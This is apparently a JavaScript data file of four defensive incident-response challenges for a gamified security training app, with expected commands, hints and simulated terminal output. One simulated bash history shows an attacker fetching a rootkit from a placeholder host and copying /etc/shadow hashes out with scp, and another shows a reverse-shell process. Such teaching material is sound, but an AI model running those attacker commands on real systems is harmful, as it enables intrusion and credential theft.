const terminalChallenges = [
    {
        id: 'terminal-1',
        title: 'Port Scanner Investigation',
        difficulty: 1,
        description: 'A suspicious server has been detected on the network. Use terminal commands to investigate open ports and identify potential vulnerabilities.',
        xpReward: 50,
        steps: [
            {
                prompt: '[ALERT] Suspicious traffic detected from IP 192.168.1.105. Scan the target to identify open ports.',
                expectedCommands: ['nmap 192.168.1.105', 'nmap -sV 192.168.1.105', 'nmap -sS 192.168.1.105'],
                hint: 'Use nmap followed by the target IP address to scan for open ports.',
                output: `Starting Nmap scan for 192.168.1.105...
Host is up (0.0023s latency).

PORT      STATE  SERVICE      VERSION
22/tcp    open   ssh          OpenSSH 8.9
80/tcp    open   http         Apache 2.4.52
443/tcp   open   https        Apache 2.4.52
3306/tcp  open   mysql        MySQL 5.7.38
8080/tcp  open   http-proxy   Unknown

Nmap done: 1 IP host scanned in 2.34 seconds`,
                successMessage: '✅ Scan complete! Notice port 8080 running an unknown proxy — that\'s suspicious.'
            },
            {
                prompt: '[ANALYSIS] Port 8080 is running an unknown HTTP proxy. Check what service is actually running on that port.',
                expectedCommands: ['curl 192.168.1.105:8080', 'curl http://192.168.1.105:8080', 'wget 192.168.1.105:8080'],
                hint: 'Use curl or wget to make a request to the suspicious port.',
                output: `HTTP/1.1 200 OK
Server: MalwareC2/3.1
X-Botnet-ID: STORM-7742

<html><body>
[C2 PANEL] Command & Control Dashboard
Status: ACTIVE | Connected Bots: 1,247
</body></html>`,
                successMessage: '🚨 This is a Command & Control server! It\'s controlling a botnet of 1,247 compromised machines.'
            },
            {
                prompt: '[ACTION REQUIRED] Block all traffic to the malicious C2 server immediately!',
                expectedCommands: ['iptables -A OUTPUT -d 192.168.1.105 -j DROP', 'firewall-cmd --add-rich-rule=\'rule family=ipv4 destination address=192.168.1.105 drop\'', 'iptables -A INPUT -s 192.168.1.105 -j DROP'],
                hint: 'Use iptables to add a DROP rule for the malicious IP address.',
                output: `iptables rule added successfully.
All outbound traffic to 192.168.1.105 is now BLOCKED.
Logging enabled for blocked connection attempts.

[FIREWALL] Rule applied:
  Chain OUTPUT (policy ACCEPT)
  target: DROP  proto: all  destination: 192.168.1.105`,
                successMessage: '✅ Excellent work! C2 traffic blocked. The botnet can no longer receive commands through this server.'
            }
        ]
    },
    {
        id: 'terminal-2',
        title: 'Malware Quarantine',
        difficulty: 2,
        description: 'A workstation has been flagged for suspicious file activity. Use the terminal to locate and quarantine the malware.',
        xpReward: 75,
        steps: [
            {
                prompt: '[INCIDENT] Workstation WS-042 reporting suspicious CPU usage. Find any recently modified suspicious files.',
                expectedCommands: ['find / -name "*.exe" -mtime -1', 'find / -mtime -1 -type f', 'find /tmp -type f -mtime -1', 'ls -la /tmp'],
                hint: 'Use the find command to search for recently modified files (within the last day).',
                output: `Searching filesystem for recently modified files...

/tmp/.hidden_svchost.exe        2.3MB   modified 2 hours ago
/tmp/.keylogger.dat             156KB   modified 45 minutes ago
/var/log/.backdoor.sh           4.1KB   modified 1 hour ago
/home/user/Downloads/invoice.pdf.exe   1.8MB   modified 3 hours ago

WARNING: Multiple suspicious files detected!`,
                successMessage: '⚠️ Found 4 suspicious files! Notice the hidden files (starting with .) and the double extension trick (.pdf.exe).'
            },
            {
                prompt: '[ANALYSIS] Check what processes are currently running from these suspicious locations.',
                expectedCommands: ['ps aux | grep tmp', 'ps aux | grep hidden', 'ps -ef | grep svchost', 'top'],
                hint: 'Use ps aux with grep to filter processes running from /tmp or with suspicious names.',
                output: `USER       PID  %CPU %MEM  COMMAND
root      4521  89.2  12.1  /tmp/.hidden_svchost.exe --mine-crypto
root      4523   4.5   2.3  /tmp/.keylogger.dat --capture-keys
root      4589   1.2   0.8  /var/log/.backdoor.sh --reverse-shell 45.33.32.156

3 malicious processes identified.`,
                successMessage: '🔍 Found it! A crypto miner, a keylogger, and a reverse shell backdoor — all running as root!'
            },
            {
                prompt: '[ACTION] Kill all malicious processes immediately!',
                expectedCommands: ['kill -9 4521 4523 4589', 'kill -9 4521', 'killall -9 hidden_svchost.exe', 'pkill -f hidden_svchost'],
                hint: 'Use kill -9 with the PIDs to force-terminate the malicious processes.',
                output: `Process 4521 (crypto miner) terminated.
Process 4523 (keylogger) terminated.
Process 4589 (backdoor) terminated.

All malicious processes have been killed.
System CPU usage returned to normal: 3.2%`,
                successMessage: '✅ Processes terminated! CPU usage is back to normal. Now let\'s remove the malware files.'
            },
            {
                prompt: '[CLEANUP] Remove all malware files and secure the system.',
                expectedCommands: ['rm -f /tmp/.hidden_svchost.exe /tmp/.keylogger.dat /var/log/.backdoor.sh', 'rm /tmp/.hidden_svchost.exe', 'rm -rf /tmp/.hidden*', 'shred -u /tmp/.hidden_svchost.exe'],
                hint: 'Use rm to delete the malicious files from the system.',
                output: `Removing malicious files...
  ✓ /tmp/.hidden_svchost.exe — DELETED
  ✓ /tmp/.keylogger.dat — DELETED
  ✓ /var/log/.backdoor.sh — DELETED
  ✓ /home/user/Downloads/invoice.pdf.exe — DELETED

All malware files removed. System quarantine complete.
Recommend: Full antivirus scan and password reset for all users.`,
                successMessage: '🎉 System cleaned! All malware has been removed. Remember to run a full scan and reset credentials.'
            }
        ]
    },
    {
        id: 'terminal-3',
        title: 'Log Analysis & Intrusion Detection',
        difficulty: 2,
        description: 'The security team suspects a brute-force attack on the SSH server. Analyze the logs to confirm and block the attacker.',
        xpReward: 75,
        steps: [
            {
                prompt: '[SECURITY] Multiple failed login attempts detected. Check the authentication logs for evidence.',
                expectedCommands: ['cat /var/log/auth.log', 'tail -100 /var/log/auth.log', 'grep "Failed" /var/log/auth.log', 'grep "failed" /var/log/auth.log'],
                hint: 'Check the authentication logs at /var/log/auth.log using cat, tail, or grep.',
                output: `Mar 04 12:01:05 sshd: Failed password for root from 203.0.113.42 port 45621
Mar 04 12:01:06 sshd: Failed password for root from 203.0.113.42 port 45622
Mar 04 12:01:07 sshd: Failed password for admin from 203.0.113.42 port 45623
Mar 04 12:01:08 sshd: Failed password for root from 203.0.113.42 port 45624
Mar 04 12:01:09 sshd: Failed password for user from 203.0.113.42 port 45625
... [847 more failed attempts from 203.0.113.42]
Mar 04 12:15:33 sshd: Accepted password for admin from 203.0.113.42 port 46102

WARNING: 852 failed attempts followed by a successful login!`,
                successMessage: '🚨 Confirmed brute-force attack! 852 failed attempts from 203.0.113.42, and they eventually got in as "admin"!'
            },
            {
                prompt: '[CRITICAL] The attacker gained access as "admin"! Check what commands they ran after logging in.',
                expectedCommands: ['cat /home/admin/.bash_history', 'history', 'last admin', 'lastlog'],
                hint: 'Check the bash history file for the compromised admin account.',
                output: `Attacker's command history (admin@203.0.113.42):

$ whoami
$ cat /etc/passwd
$ wget http://evil.example.com/rootkit.sh
$ chmod +x rootkit.sh
$ ./rootkit.sh
$ crontab -e  (added persistence)
$ cat /etc/shadow > /tmp/hashes.txt
$ scp /tmp/hashes.txt attacker@203.0.113.42:/loot/

Attacker downloaded a rootkit and exfiltrated password hashes!`,
                successMessage: '💀 The attacker downloaded a rootkit, established persistence via crontab, and stole password hashes!'
            },
            {
                prompt: '[RESPONSE] Block the attacker\'s IP and disable the compromised account immediately!',
                expectedCommands: ['iptables -A INPUT -s 203.0.113.42 -j DROP', 'ufw deny from 203.0.113.42', 'firewall-cmd --add-rich-rule=\'rule family=ipv4 source address=203.0.113.42 drop\''],
                hint: 'Use iptables or ufw to block all traffic from the attacker\'s IP: 203.0.113.42',
                output: `Firewall rule applied:
  BLOCKED: All traffic from 203.0.113.42

Disabling compromised account...
  ✓ Account 'admin' locked
  ✓ All active sessions terminated
  ✓ SSH key revoked

Attacker IP blocked. Compromised account disabled.
Next steps: Remove rootkit, rotate all passwords, audit crontab entries.`,
                successMessage: '✅ Attacker blocked and account disabled! Critical: You should now remove the rootkit and rotate ALL passwords.'
            }
        ]
    },
    {
        id: 'terminal-4',
        title: 'Network Traffic Analysis',
        difficulty: 3,
        description: 'Unusual outbound traffic has been detected. Use network tools to identify data exfiltration and shut it down.',
        xpReward: 100,
        steps: [
            {
                prompt: '[ALERT] Network monitoring shows unusual outbound traffic spikes at 3 AM. Capture and analyze the traffic.',
                expectedCommands: ['tcpdump -i eth0', 'tcpdump -i any', 'netstat -tulpn', 'ss -tulpn', 'netstat -an'],
                hint: 'Use tcpdump or netstat to see active network connections and traffic.',
                output: `Active Internet connections:
Proto  Local Address        Foreign Address       State       PID/Program
tcp    0.0.0.0:22          0.0.0.0:*             LISTEN      1234/sshd
tcp    0.0.0.0:80          0.0.0.0:*             LISTEN      5678/apache2
tcp    10.0.0.5:49152      185.141.63.120:443    ESTABLISHED 9012/unknown
tcp    10.0.0.5:49153      185.141.63.120:8443   ESTABLISHED 9013/unknown
udp    10.0.0.5:53         185.141.63.120:53     ESTABLISHED 9014/dns-tunnel

⚠ SUSPICIOUS: 3 connections to 185.141.63.120 using unusual ports + DNS tunneling`,
                successMessage: '🔍 Found suspicious connections! 3 active connections to 185.141.63.120 including a DNS tunnel — classic data exfiltration!'
            },
            {
                prompt: '[INVESTIGATION] Identify what data is being sent through these suspicious connections.',
                expectedCommands: ['lsof -p 9012', 'lsof -i :49152', 'strace -p 9012', 'ls -la /proc/9012/fd'],
                hint: 'Use lsof to see what files the suspicious process (PID 9012) has open.',
                output: `Process 9012 - Open files and connections:
  /home/shared/financial_records_2024.xlsx  (READ)
  /home/shared/employee_database.csv       (READ)
  /home/shared/client_contracts/            (READ)
  /tmp/.exfil_queue                         (READ/WRITE)
  185.141.63.120:443                        (ESTABLISHED)

Data exfiltration queue contains 2.3 GB of sensitive corporate data!`,
                successMessage: '💀 Data exfiltration confirmed! Financial records, employee data, and client contracts are being stolen!'
            },
            {
                prompt: '[EMERGENCY] Terminate all connections to the attacker server and kill the exfiltration processes!',
                expectedCommands: ['kill -9 9012 9013 9014', 'kill -9 9012', 'iptables -A OUTPUT -d 185.141.63.120 -j DROP', 'killall unknown'],
                hint: 'Kill the suspicious processes and block the attacker\'s IP address.',
                output: `Terminating exfiltration processes...
  ✓ PID 9012 terminated — file transfer interrupted
  ✓ PID 9013 terminated — backup channel closed
  ✓ PID 9014 terminated — DNS tunnel destroyed

Applying firewall rules...
  ✓ All outbound traffic to 185.141.63.120 BLOCKED
  ✓ DNS tunneling signatures added to IDS

Data exfiltration stopped. Estimated 800MB was exfiltrated before intervention.
Critical: Notify legal team and initiate incident response plan.`,
                successMessage: '🛡️ Exfiltration halted! You stopped the attack before all data was stolen. Excellent incident response!'
            }
        ]
    }
];

export default terminalChallenges;
